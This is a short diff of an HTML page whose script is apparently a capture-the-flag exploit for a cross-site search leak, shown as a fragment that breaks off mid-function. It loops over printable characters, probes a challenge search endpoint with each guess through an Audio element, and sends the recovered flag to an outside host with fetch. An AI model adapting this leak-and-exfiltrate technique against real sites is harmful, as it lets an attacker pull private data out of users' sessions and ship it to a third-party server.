@@ -9,13 +9,8 @@
 
 <body>
 <script>
-    const $ = document;
     let chars = ` !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_\`abcdefghijklmnopqrstuvwxyz{|}~`;
     let flag = '';
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-x
     function send(char) {
         fetch("https://lyj.kr/debug" + flag);
         const audio2 = new Audio(`http://prob.hspace.io:26019/search?query=${encodeURIComponent(flag + char)}`);
